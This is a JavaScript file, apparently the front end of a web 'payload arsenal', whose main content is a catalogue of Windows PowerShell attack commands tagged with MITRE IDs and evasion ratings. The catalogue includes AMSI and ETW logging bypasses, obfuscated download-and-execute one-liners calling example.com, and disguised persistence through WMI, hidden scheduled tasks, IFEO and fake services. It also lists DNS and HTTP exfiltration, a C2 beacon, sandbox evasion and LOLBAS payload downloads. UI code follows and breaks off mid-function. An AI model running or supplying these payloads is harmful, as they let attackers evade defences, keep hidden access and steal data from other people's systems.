
// Enhanced Payloads Database with comprehensive techniques
const payloads = {
  // Basic System Information
  sysinfo: {
    command: "Get-ComputerInfo | Select-Object WindowsProductName, WindowsVersion, TotalPhysicalMemory, CsProcessors, CsManufacturer, CsModel, WindowsInstallDateFromRegistry",
    description: "Retrieves comprehensive system information including OS version, hardware details, and installation date.",
    complexity: "basic",
    platform: "windows",
    category: "System Information",
    author: "0x0806",
    tags: ["reconnaissance", "system", "information gathering"],
    mitre_id: "T1082",
    detection_difficulty: "Low",
    evasion_rating: 1
  },
  processes: {
    command: "Get-Process | Sort-Object CPU -Descending | Select-Object -First 15 Name, CPU, WorkingSet, Id, ProcessName, Company, Description | Format-Table -AutoSize",
    description: "Lists top processes with detailed information including company and description for threat hunting.",
    complexity: "basic",
    platform: "windows",
    category: "Process Discovery",
    author: "0x0806",
    tags: ["reconnaissance", "processes", "monitoring"],
    mitre_id: "T1057",
    detection_difficulty: "Low",
    evasion_rating: 1
  },
  services: {
    command: "Get-Service | Where-Object {$_.Status -eq 'Running'} | Select-Object Name, Status, StartType, ServiceType | Sort-Object Name",
    description: "Comprehensive service enumeration with startup configuration details.",
    complexity: "basic",
    platform: "windows",
    category: "Service Discovery",
    author: "0x0806",
    tags: ["reconnaissance", "services", "enumeration"],
    mitre_id: "T1007",
    detection_difficulty: "Low",
    evasion_rating: 1
  },
  network: {
    command: "Get-NetIPConfiguration | Select-Object InterfaceAlias, IPv4Address, IPv6Address, IPv4DefaultGateway, DNSServer",
    description: "Detailed network configuration including IPv6 and DNS server information.",
    complexity: "basic",
    platform: "windows",
    category: "Network Discovery",
    author: "0x0806",
    tags: ["reconnaissance", "network", "configuration"],
    mitre_id: "T1016",
    detection_difficulty: "Low",
    evasion_rating: 1
  },

  // File System Operations
  listfiles: {
    command: "Get-ChildItem -Path C:\\ -Recurse -Force -ErrorAction SilentlyContinue | Where-Object {!$_.PSIsContainer -and $_.Length -gt 1MB} | Select-Object Name, Length, LastWriteTime, Directory | Sort-Object Length -Descending | Select-Object -First 50",
    description: "Lists large files across C: drive for data exfiltration assessment.",
    complexity: "intermediate",
    platform: "windows",
    category: "File Discovery",
    author: "0x0806",
    tags: ["reconnaissance", "files", "enumeration"],
    mitre_id: "T1083",
    detection_difficulty: "Medium",
    evasion_rating: 2
  },
  findfiles: {
    command: "Get-ChildItem -Path C:\\ -Recurse -Include *.txt, *.doc*, *.pdf, *.xls*, *.ppt*, *.zip, *.rar -ErrorAction SilentlyContinue | Select-Object Name, Directory, Length, LastWriteTime",
    description: "Advanced document discovery including compressed files and office documents.",
    complexity: "intermediate",
    platform: "windows",
    category: "Sensitive File Discovery",
    author: "0x0806",
    tags: ["reconnaissance", "documents", "data"],
    mitre_id: "T1083",
    detection_difficulty: "Medium",
    evasion_rating: 2
  },
  credentials_search: {
    command: "Get-ChildItem -Path C:\\ -Recurse -Include *.txt, *.cfg, *.config, *.xml, *.ini -ErrorAction SilentlyContinue | Select-String -Pattern 'password|passwd|pwd|credential|secret|key' -CaseSensitive:$false",
    description: "Searches for potential credential files and configuration containing sensitive data.",
    complexity: "intermediate",
    platform: "windows",
    category: "Credential Access",
    author: "0x0806",
    tags: ["credentials", "files", "search"],
    mitre_id: "T1552.001",
    detection_difficulty: "Medium",
    evasion_rating: 3
  },

  // User & Security
  currentuser: {
    command: "whoami /all | Out-String; Get-LocalUser | Select-Object Name, Enabled, LastLogon, PasswordLastSet",
    description: "Comprehensive current user context and local user account enumeration.",
    complexity: "basic",
    platform: "windows",
    category: "User Discovery",
    author: "0x0806",
    tags: ["reconnaissance", "users", "privileges"],
    mitre_id: "T1033",
    detection_difficulty: "Low",
    evasion_rating: 1
  },
  localusers: {
    command: "Get-LocalUser | Select-Object Name, Enabled, LastLogon, PasswordLastSet, PasswordExpires, PasswordRequired | Format-Table -AutoSize",
    description: "Detailed local user account information including password policies.",
    complexity: "basic",
    platform: "windows",
    category: "Account Discovery",
    author: "0x0806",
    tags: ["reconnaissance", "users", "accounts"],
    mitre_id: "T1087.001",
    detection_difficulty: "Low",
    evasion_rating: 1
  },
  groups: {
    command: "Get-LocalGroup | ForEach-Object { $group = $_.Name; Get-LocalGroupMember -Group $group -ErrorAction SilentlyContinue | Select-Object @{Name='Group';Expression={$group}}, Name, ObjectClass, PrincipalSource }",
    description: "Enumerates all local groups and their members for privilege escalation assessment.",
    complexity: "intermediate",
    platform: "windows",
    category: "Permission Groups Discovery",
    author: "0x0806",
    tags: ["reconnaissance", "groups", "privileges"],
    mitre_id: "T1069.001",
    detection_difficulty: "Low",
    evasion_rating: 2
  },
  privileges: {
    command: "whoami /priv; secedit /export /cfg C:\\temp\\secpol.cfg > $null 2>&1; Get-Content C:\\temp\\secpol.cfg | Select-String -Pattern 'SeDebugPrivilege|SeImpersonatePrivilege|SeTcbPrivilege|SeBackupPrivilege|SeRestorePrivilege'",
    description: "Advanced privilege enumeration including security policy analysis.",
    complexity: "intermediate",
    platform: "windows",
    category: "System Information Discovery",
    author: "0x0806",
    tags: ["privileges", "security", "policy"],
    mitre_id: "T1082",
    detection_difficulty: "Medium",
    evasion_rating: 2
  },

  // Advanced Techniques
  encoded: {
    command: "powershell.exe -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAcwAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBlAHgAYQBtAHAAbABlAC4AYwBvAG0ALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAIgApAA==",
    description: "Base64 encoded PowerShell command execution to bypass basic detection.",
    complexity: "advanced",
    platform: "windows",
    category: "Defense Evasion",
    author: "0x0806",
    tags: ["evasion", "encoding", "obfuscation"],
    mitre_id: "T1027",
    detection_difficulty: "Medium",
    evasion_rating: 3
  },
  oneliner: {
    command: "IEX ((New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1'))",
    description: "Classic PowerShell download and execute one-liner for payload delivery.",
    complexity: "intermediate",
    platform: "windows",
    category: "Command and Scripting Interpreter",
    author: "0x0806",
    tags: ["download", "execute", "oneliner"],
    mitre_id: "T1059.001",
    detection_difficulty: "High",
    evasion_rating: 2
  },
  registry: {
    command: "Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -ErrorAction SilentlyContinue; Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce' -ErrorAction SilentlyContinue",
    description: "Registry persistence location enumeration for threat hunting.",
    complexity: "intermediate",
    platform: "windows",
    category: "Boot or Logon Autostart Execution",
    author: "0x0806",
    tags: ["registry", "persistence", "autostart"],
    mitre_id: "T1547.001",
    detection_difficulty: "Low",
    evasion_rating: 2
  },
  eventlogs: {
    command: "Get-EventLog -LogName Security -Newest 10 | Select-Object TimeGenerated, EventID, Message; Get-EventLog -LogName System -Newest 10 | Select-Object TimeGenerated, EventID, Message",
    description: "Security and system event log analysis for forensic investigation.",
    complexity: "intermediate",
    platform: "windows",
    category: "System Information Discovery",
    author: "0x0806",
    tags: ["logs", "forensics", "events"],
    mitre_id: "T1082",
    detection_difficulty: "Low",
    evasion_rating: 1
  },

  // EDR Bypass Techniques (Advanced)
  amsibypass: {
    command: "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
    description: "AMSI bypass using reflection to disable Windows Antimalware Scan Interface.",
    complexity: "advanced",
    platform: "windows",
    category: "Defense Evasion",
    author: "0x0806",
    tags: ["evasion", "amsi", "bypass", "antimalware"],
    mitre_id: "T1562.001",
    detection_difficulty: "High",
    evasion_rating: 4,
    warning: "May trigger advanced EDR solutions"
  },
  etw_bypass: {
    command: "[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null), 0)",
    description: "ETW bypass to prevent PowerShell script block logging and telemetry.",
    complexity: "advanced",
    platform: "windows",
    category: "Defense Evasion",
    author: "0x0806",
    tags: ["evasion", "etw", "logging", "bypass"],
    mitre_id: "T1562.006",
    detection_difficulty: "High",
    evasion_rating: 4,
    warning: "Blocks security telemetry"
  },
  scriptblock_bypass: {
    command: "$GPF=[ref].Assembly.GetType('System.Management.Automation.Utils').GetField('signatures','N'+'onPublic,Static'); $GPF.SetValue($null,(New-Object Collections.Generic.HashSet[string]))",
    description: "Script block logging bypass by clearing PowerShell signature cache.",
    complexity: "advanced",
    platform: "windows",
    category: "Defense Evasion",
    author: "0x0806",
    tags: ["evasion", "scriptblock", "logging", "signatures"],
    mitre_id: "T1562.006",
    detection_difficulty: "High",
    evasion_rating: 4
  },
  constrained_bypass: {
    command: "[Environment]::SetEnvironmentVariable('__PSLockDownPolicy', $null, [EnvironmentVariableTarget]::Machine); $ExecutionContext.SessionState.LanguageMode = 'FullLanguage'",
    description: "PowerShell constrained language mode bypass for unrestricted execution.",
    complexity: "advanced",
    platform: "windows",
    category: "Defense Evasion",
    author: "0x0806",
    tags: ["evasion", "constrained", "language mode"],
    mitre_id: "T1562.001",
    detection_difficulty: "High",
    evasion_rating: 4
  },
  reflective_loading: {
    command: "$code = [System.Convert]::FromBase64String('TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAAAAAAAAAAA='); [System.Reflection.Assembly]::Load($code)",
    description: "Reflective DLL loading technique to execute code from memory without disk artifacts.",
    complexity: "expert",
    platform: "windows",
    category: "Defense Evasion",
    author: "0x0806",
    tags: ["memory", "reflective", "dll", "loading"],
    mitre_id: "T1055.001",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },
  obfuscated_invoke: {
    command: "$a='IEX';$b='(New-Object Net.WebClient)';$c='.DownloadString';$u='http://example.com/payload.ps1';$cmd=$a+'('+$b+$c+'('''+$u+'''))';IEX $cmd",
    description: "Advanced string obfuscation technique to evade signature-based detection.",
    complexity: "advanced",
    platform: "windows",
    category: "Defense Evasion",
    author: "0x0806",
    tags: ["obfuscation", "string", "evasion"],
    mitre_id: "T1027",
    detection_difficulty: "High",
    evasion_rating: 3
  },

  // Memory Manipulation (Expert Level)
  memory_patching: {
    command: "$code='[DllImport(\"kernel32.dll\")]public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpfOldProtectect);[DllImport(\"kernel32.dll\")]public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);[DllImport(\"kernel32.dll\")]public static extern IntPtr LoadLibrary(string lpFileName);';Add-Type -MemberDefinition $code -Name MemPatch -Namespace Win32;$lib=[Win32.MemPatch]::LoadLibrary('ntdll.dll');$addr=[Win32.MemPatch]::GetProcAddress($lib,'NtCreateThreadEx');$oldProtect=0;[Win32.MemPatch]::VirtualProtect($addr,5,0x40,[ref]$oldProtect);[System.Runtime.InteropServices.Marshal]::WriteByte($addr,0xC3)",
    description: "Direct memory patching of NTDLL functions to bypass API hooking and monitoring.",
    complexity: "expert",
    platform: "windows",
    category: "Defense Evasion",
    author: "0x0806",
    tags: ["memory", "patching", "ntdll", "api hooking"],
    mitre_id: "T1055.001",
    detection_difficulty: "Very High",
    evasion_rating: 5,
    warning: "Kernel-level detection may still occur"
  },
  syscall_direct: {
    command: "$code='[DllImport(\"ntdll.dll\")]public static extern uint NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);[DllImport(\"ntdll.dll\")]public static extern uint NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, IntPtr Buffer, uint NumberOfBytesToWrite, ref uint NumberOfBytesWritten);[DllImport(\"ntdll.dll\")]public static extern uint NtCreateThreadEx(out IntPtr ThreadHandle, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr lpStartAddress, IntPtr lpParameter, bool CreateSuspended, uint StackZeroBits, uint SizeOfStackCommit, uint SizeOfStackReserve, IntPtr lpBytesBuffer);';Add-Type -MemberDefinition $code -Name DirectSyscall -Namespace Win32",
    description: "Direct syscall invocation bypassing user-mode API hooks through NTDLL.",
    complexity: "expert",
    platform: "windows",
    category: "Defense Evasion",
    author: "0x0806",
    tags: ["syscalls", "ntdll", "direct", "api bypass"],
    mitre_id: "T1055",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },
  heaven_gate: {
    command: "$code='[DllImport(\"kernel32.dll\")]public static extern IntPtr GetCurrentProcess();[DllImport(\"kernel32.dll\")]public static extern bool IsWow64Process(IntPtr hProcess, out bool Wow64Process);';Add-Type -MemberDefinition $code -Name HeavenGate -Namespace Win32;$isWow64=$false;[Win32.HeavenGate]::IsWow64Process([Win32.HeavenGate]::GetCurrentProcess(),[ref]$isWow64);if($isWow64){Write-Host 'Heaven Gate transition possible - WoW64 detected'}",
    description: "Heaven's Gate technique for transitioning between 32-bit and 64-bit execution contexts.",
    complexity: "expert",
    platform: "windows",
    category: "Defense Evasion",
    author: "0x0806",
    tags: ["heaven gate", "wow64", "architecture", "transition"],
    mitre_id: "T1055",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },
  manual_dll_loading: {
    command: "$code='[DllImport(\"kernel32.dll\")]public static extern IntPtr LoadLibraryA(string lpLibFileName);[DllImport(\"kernel32.dll\")]public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);[DllImport(\"kernel32.dll\")]public static extern bool FreeLibrary(IntPtr hLibModule);';Add-Type -MemberDefinition $code -Name ManualLoader -Namespace Win32;$lib=[Win32.ManualLoader]::LoadLibraryA('user32.dll');$func=[Win32.ManualLoader]::GetProcAddress($lib,'MessageBoxA')",
    description: "Manual DLL loading and function resolution to avoid import table detection.",
    complexity: "expert",
    platform: "windows",
    category: "Defense Evasion",
    author: "0x0806",
    tags: ["dll", "manual", "loading", "import table"],
    mitre_id: "T1055.001",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },
  process_hollowing: {
    command: "$code='[DllImport(\"kernel32.dll\")]public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);[DllImport(\"kernel32.dll\")]public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);[DllImport(\"kernel32.dll\")]public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);';Add-Type -MemberDefinition $code -Name ProcessHollow -Namespace Win32",
    description: "Process hollowing setup for injecting malicious code into legitimate processes.",
    complexity: "expert",
    platform: "windows",
    category: "Process Injection",
    author: "0x0806",
    tags: ["process", "hollowing", "injection"],
    mitre_id: "T1055.012",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },

  // Network & Covert Channels
  dns_tunneling: {
    command: "$data = 'SGVsbG8gV29ybGQ='; $chunks = [regex]::matches($data, '.{1,60}') | % {$_.value}; foreach($chunk in $chunks) { nslookup \"$chunk.example.com\" }",
    description: "DNS tunneling technique for covert data exfiltration through DNS queries.",
    complexity: "advanced",
    platform: "windows",
    category: "Exfiltration Over Alternative Protocol",
    author: "0x0806",
    tags: ["dns", "tunneling", "exfiltration", "covert"],
    mitre_id: "T1048.003",
    detection_difficulty: "High",
    evasion_rating: 4
  },
  icmp_tunnel: {
    command: "$data = [System.Text.Encoding]::UTF8.GetBytes('test data'); $icmp = New-Object System.Net.NetworkInformation.Ping; $options = New-Object System.Net.NetworkInformation.PingOptions; $icmp.Send('8.8.8.8', 5000, $data, $options)",
    description: "ICMP tunneling for covert communication using ping packets with embedded data.",
    complexity: "advanced",
    platform: "windows",
    category: "Exfiltration Over Alternative Protocol",
    author: "0x0806",
    tags: ["icmp", "tunneling", "ping", "covert"],
    mitre_id: "T1048.003",
    detection_difficulty: "High",
    evasion_rating: 4
  },
  tcp_beacon: {
    command: "$client = New-Object System.Net.Sockets.TcpClient; try { $client.Connect('192.168.1.100', 4444); $stream = $client.GetStream(); $writer = New-Object System.IO.StreamWriter($stream); $writer.WriteLine((Get-Date).ToString() + ' - Beacon'); $writer.Flush() } catch { } finally { $client.Close() }",
    description: "TCP beacon for establishing covert command and control communication.",
    complexity: "advanced",
    platform: "windows",
    category: "Application Layer Protocol",
    author: "0x0806",
    tags: ["tcp", "beacon", "c2", "communication"],
    mitre_id: "T1071.001",
    detection_difficulty: "High",
    evasion_rating: 3
  },
  http_tunnel: {
    command: "$webClient = New-Object System.Net.WebClient; $webClient.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'); $response = $webClient.UploadString('http://example.com/tunnel', 'POST', (Get-ComputerInfo | ConvertTo-Json))",
    description: "HTTP tunneling with legitimate user agent for data exfiltration over HTTPS.",
    complexity: "intermediate",
    platform: "windows",
    category: "Exfiltration Over Web Service",
    author: "0x0806",
    tags: ["http", "tunnel", "exfiltration", "user agent"],
    mitre_id: "T1567.002",
    detection_difficulty: "Medium",
    evasion_rating: 3
  },

  // Advanced Persistence
  wmi_backdoor: {
    command: "$filterName = 'WindowsUpdateFilter'; $consumerName = 'WindowsUpdateConsumer'; $payload = 'powershell.exe -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString(`\"http://example.com/payload.ps1`\")\"'; Register-WmiEvent -Query \"SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2\" -Action ([ScriptBlock]::Create($payload)) -SourceIdentifier $filterName",
    description: "WMI event subscription for stealthy persistence using system events.",
    complexity: "expert",
    platform: "windows",
    category: "Event Triggered Execution",
    author: "0x0806",
    tags: ["wmi", "persistence", "events", "stealth"],
    mitre_id: "T1546.003",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },
  scheduled_task_stealth: {
    command: "$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString(`\"http://example.com/payload.ps1`\")\"'; $trigger = New-ScheduledTaskTrigger -AtLogon; $settings = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit 0; Register-ScheduledTask -TaskName 'WindowsUpdateTask' -Action $action -Trigger $trigger -Settings $settings -User 'SYSTEM'",
    description: "Hidden scheduled task with system privileges for persistent access.",
    complexity: "advanced",
    platform: "windows",
    category: "Scheduled Task/Job",
    author: "0x0806",
    tags: ["scheduled task", "persistence", "hidden", "system"],
    mitre_id: "T1053.005",
    detection_difficulty: "High",
    evasion_rating: 4
  },
  image_file_execution: {
    command: "New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe' -Name 'Debugger' -Value 'powershell.exe -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString(`\"http://example.com/payload.ps1`\")\"' -PropertyType String",
    description: "Image File Execution Options persistence technique hijacking legitimate executables.",
    complexity: "advanced",
    platform: "windows",
    category: "Image File Execution Options Injection",
    author: "0x0806",
    tags: ["ifeo", "persistence", "hijacking", "registry"],
    mitre_id: "T1546.012",
    detection_difficulty: "High",
    evasion_rating: 4
  },
  service_persistence: {
    command: "New-Service -Name 'WindowsUpdateService' -BinaryPathName 'powershell.exe -WindowStyle Hidden -Command \"while($true) { IEX (New-Object Net.WebClient).DownloadString(`\"http://example.com/payload.ps1`\"); Start-Sleep 3600 }\"' -DisplayName 'Windows Update Service' -Description 'Provides software update functionality' -StartupType Automatic",
    description: "Malicious service creation disguised as legitimate Windows service.",
    complexity: "advanced",
    platform: "windows",
    category: "Create or Modify System Process",
    author: "0x0806",
    tags: ["service", "persistence", "disguise"],
    mitre_id: "T1543.003",
    detection_difficulty: "Medium",
    evasion_rating: 3
  },

  // Anti-Analysis & Sandbox Evasion
  timing_evasion: {
    command: "$start = Get-Date; Start-Sleep -Seconds 120; $end = Get-Date; $elapsed = ($end - $start).TotalSeconds; if ($elapsed -lt 115) { exit } else { Write-Host 'Sandbox evasion successful - proceeding with payload' }",
    description: "Time-based sandbox evasion using sleep delays to detect automated analysis.",
    complexity: "intermediate",
    platform: "windows",
    category: "Virtualization/Sandbox Evasion",
    author: "0x0806",
    tags: ["timing", "sandbox", "evasion", "sleep"],
    mitre_id: "T1497.003",
    detection_difficulty: "Medium",
    evasion_rating: 3
  },
  mouse_movement: {
    command: "Add-Type -AssemblyName System.Windows.Forms; $pos1 = [System.Windows.Forms.Cursor]::Position; Start-Sleep -Seconds 30; $pos2 = [System.Windows.Forms.Cursor]::Position; if (($pos1.X -eq $pos2.X) -and ($pos1.Y -eq $pos2.Y)) { exit } else { Write-Host 'Human interaction detected - proceeding' }",
    description: "Mouse movement detection to identify human interaction and evade sandboxes.",
    complexity: "intermediate",
    platform: "windows",
    category: "Virtualization/Sandbox Evasion",
    author: "0x0806",
    tags: ["mouse", "interaction", "sandbox", "human"],
    mitre_id: "T1497.002",
    detection_difficulty: "Medium",
    evasion_rating: 3
  },
  vm_detection: {
    command: "$vm_indicators = @('VMware', 'VirtualBox', 'VBOX', 'Hyper-V', 'QEMU'); $system_info = Get-WmiObject -Class Win32_ComputerSystem; $vm_detected = $false; foreach ($indicator in $vm_indicators) { if ($system_info.Model -like \"*$indicator*\" -or $system_info.Manufacturer -like \"*$indicator*\") { $vm_detected = $true; break } } if ($vm_detected) { exit } else { Write-Host 'Physical machine detected' }",
    description: "Virtual machine detection using WMI to identify virtualized environments.",
    complexity: "intermediate",
    platform: "windows",
    category: "Virtualization/Sandbox Evasion",
    author: "0x0806",
    tags: ["vm", "detection", "wmi", "virtualization"],
    mitre_id: "T1497.001",
    detection_difficulty: "Medium",
    evasion_rating: 3
  },
  debugger_detection: {
    command: "$debugger_present = [System.Diagnostics.Debugger]::IsAttached; $parent_process = (Get-WmiObject Win32_Process -Filter \"ProcessId=$PID\").ParentProcessId; $parent_name = (Get-Process -Id $parent_process -ErrorAction SilentlyContinue).ProcessName; if ($debugger_present -or $parent_name -in @('windbg', 'x64dbg', 'ollydbg', 'ida', 'ghidra')) { exit } else { Write-Host 'No debugger detected' }",
    description: "Advanced debugger detection using multiple techniques including parent process analysis.",
    complexity: "advanced",
    platform: "windows",
    category: "Debugger Evasion",
    author: "0x0806",
    tags: ["debugger", "detection", "analysis", "parent process"],
    mitre_id: "T1497.001",
    detection_difficulty: "High",
    evasion_rating: 4
  },

  // Encryption & Obfuscation
  chacha20_encryption: {
    command: "$key = [System.Security.Cryptography.RandomNumberGenerator]::GetBytes(32); $nonce = [System.Security.Cryptography.RandomNumberGenerator]::GetBytes(12); $plaintext = [System.Text.Encoding]::UTF8.GetBytes('Sensitive Data'); Add-Type -AssemblyName System.Security; $chacha = [System.Security.Cryptography.ChaCha20Poly1305]::new($key); $ciphertext = $chacha.Encrypt($nonce, $plaintext, $null); [Convert]::ToBase64String($ciphertext)",
    description: "ChaCha20 encryption for secure payload obfuscation and data protection.",
    complexity: "expert",
    platform: "windows",
    category: "Data Obfuscation",
    author: "0x0806",
    tags: ["encryption", "chacha20", "obfuscation"],
    mitre_id: "T1027",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },
  polymorphic_shellcode: {
    command: "$shellcode = @(0x48, 0x31, 0xc0, 0x48, 0x31, 0xdb); $key = Get-Random -Maximum 255; $encrypted = $shellcode | ForEach-Object { $_ -bxor $key }; $decoder = \"for(`$i=0;`$i -lt `$encrypted.Length;`$i++){`$encrypted[`$i] = `$encrypted[`$i] -bxor $key}\"; Write-Host \"Polymorphic payload generated with key: $key\"",
    description: "Polymorphic shellcode generation with XOR encryption and dynamic key generation.",
    complexity: "expert",
    platform: "windows",
    category: "Data Obfuscation",
    author: "0x0806",
    tags: ["polymorphic", "shellcode", "xor", "encryption"],
    mitre_id: "T1027.002",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },
  string_encryption: {
    command: "$plaintext = 'powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString(`\"http://example.com/payload.ps1`\")\"'; $key = [System.Text.Encoding]::UTF8.GetBytes('MySecretKey12345'); $encrypted = [System.Security.Cryptography.ProtectedData]::Protect([System.Text.Encoding]::UTF8.GetBytes($plaintext), $key, 'CurrentUser'); $b64 = [Convert]::ToBase64String($encrypted); Write-Host \"Encrypted command: $b64\"",
    description: "String encryption using Windows Data Protection API for command obfuscation.",
    complexity: "advanced",
    platform: "windows",
    category: "Data Obfuscation",
    author: "0x0806",
    tags: ["string", "encryption", "dpapi", "obfuscation"],
    mitre_id: "T1027",
    detection_difficulty: "High",
    evasion_rating: 4
  },

  // Living Off The Land (LOLBAS)
  certutil_download: {
    command: "certutil.exe -urlcache -split -f http://example.com/payload.exe C:\\temp\\payload.exe",
    description: "File download using CertUtil.exe for living off the land technique.",
    complexity: "intermediate",
    platform: "windows",
    category: "Ingress Tool Transfer",
    author: "0x0806",
    tags: ["lolbas", "certutil", "download", "living off land"],
    mitre_id: "T1105",
    detection_difficulty: "Medium",
    evasion_rating: 3
  },
  bitsadmin_download: {
    command: "bitsadmin.exe /transfer backdoor http://example.com/payload.exe C:\\temp\\payload.exe",
    description: "Background file transfer using BITSAdmin for covert payload delivery.",
    complexity: "intermediate",
    platform: "windows",
    category: "Ingress Tool Transfer",
    author: "0x0806",
    tags: ["lolbas", "bitsadmin", "download", "background"],
    mitre_id: "T1105",
    detection_difficulty: "Medium",
    evasion_rating: 3
  },
  regsvr32_bypass: {
    command: "regsvr32.exe /s /n /u /i:http://example.com/payload.sct scrobj.dll",
    description: "RegSvr32 scriptlet execution for application whitelisting bypass.",
    complexity: "advanced",
    platform: "windows",
    category: "System Binary Proxy Execution",
    author: "0x0806",
    tags: ["lolbas", "regsvr32", "scriptlet", "bypass"],
    mitre_id: "T1218.010",
    detection_difficulty: "High",
    evasion_rating: 4
  },
  mshta_execution: {
    command: "mshta.exe \"javascript:a=GetObject('script:http://example.com/payload.sct').Exec();close()\"",
    description: "MSHTA JavaScript execution for application whitelisting evasion.",
    complexity: "advanced",
    platform: "windows",
    category: "System Binary Proxy Execution",
    author: "0x0806",
    tags: ["lolbas", "mshta", "javascript", "execution"],
    mitre_id: "T1218.005",
    detection_difficulty: "High",
    evasion_rating: 4
  }
};

// Enhanced UI State Management Class
class PayloadArsenal {
    constructor() {
        this.currentSection = 'basic';
        this.currentTheme = localStorage.getItem('theme') || 'dark';
        this.searchTerm = '';
        this.activeFilters = {
            complexity: ['basic', 'intermediate', 'advanced', 'expert'],
            platform: ['windows', 'linux', 'macos']
        };
        this.favorites = JSON.parse(localStorage.getItem('favorites') || '[]');
        this.payloadHistory = JSON.parse(localStorage.getItem('payloadHistory') || '[]');
        this.init();
    }

    init() {
        this.setupEventListeners();
        this.setupSearch();
        this.setupFilters();
        this.setupMobileNavigation();
        this.loadSection('basic');
        this.updateTheme();
        this.setupKeyboardShortcuts();
        this.setupTooltips();
    }

    setupEventListeners() {
        // Navigation
        document.querySelectorAll('.nav-item').forEach(item => {
            item.addEventListener('click', (e) => {
                const section = e.target.dataset.section;
                if (section) {
                    this.loadSection(section);
                }
            });
        });

        // Theme toggle
        document.getElementById('themeToggle').addEventListener('click', () => {
            this.toggleTheme();
        });

        // Mobile menu toggle
        document.getElementById('menuToggle').addEventListener('click', () => {
            this.toggleMobileMenu();
        });

        // Filter toggle
        document.getElementById('filterBtn').addEventListener('click', () => {
            this.toggleFilters();
        });

        // Search
        document.getElementById('searchInput').addEventListener('input', (e) => {
            this.performSearch(e.target.value);
        });

        // Escape key handlers
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') {
                this.closeOutput();
                this.closeModal();
                this.toggleFilters(false);
            }
        });

        // Mobile swipe gestures
        this.setupSwipeGestures();
    }

    setupSearch() {
        const searchInput = document.getElementById('searchInput');
        
        // Debounced search
        let searchTimeout;
        searchInput.addEventListener('input', (e) => {
            clearTimeout(searchTimeout);
            searchTimeout = setTimeout(() => {
                this.performSearch(e.target.value);
            }, 300);
        });

        // Search shortcuts
        document.addEventListener('keydown', (e) => {
            if ((e.ctrlKey || e.metaKey) && e.key === 'f') {
                e.preventDefault();
                searchInput.focus();
            }
        });
    }

    setupFilters() {
        document.querySelectorAll('.filter-option input').forEach(checkbox => {
            checkbox.addEventListener('change', () => {
                this.updateFilters();
                this.filterPayloads();
            });
        });
    }

    setupMobileNavigation() {
        // Close sidebar when clicking outside
        document.addEventListener('click', (e) => {
            const sidebar = document.getElementById('sidebar');
            const menuToggle = document.getElementById('menuToggle');
            
            if (window.innerWidth <= 1024 && 
                !sidebar.contains(e.target) && 
                !menuToggle.contains(e.target) && 
                sidebar.classList.contains('active')) {
                sidebar.classList.remove('active');
            }
        });

        // Handle window resize
        window.addEventListener('resize', () => {
            if (window.innerWidth > 1024) {
                document.getElementById('sidebar').classList.remove('active');
            }
        });
    }

    setupSwipeGestures() {
        let startX, startY, distX, distY;

        document.addEventListener('touchstart', (e) => {
            const touch = e.touches[0];
            startX = touch.pageX;
            startY = touch.pageY;
        });

        document.addEventListener('touchmove', (e) => {
            if (!startX || !startY) return;

            const touch = e.touches[0];
            distX = touch.pageX - startX;
            distY = touch.pageY - startY;
        });

        document.addEventListener('touchend', () => {
            if (!startX || !startY) return;

            // Swipe right to open sidebar
            if (distX > 100 && Math.abs(distY) < 100 && window.innerWidth <= 1024) {
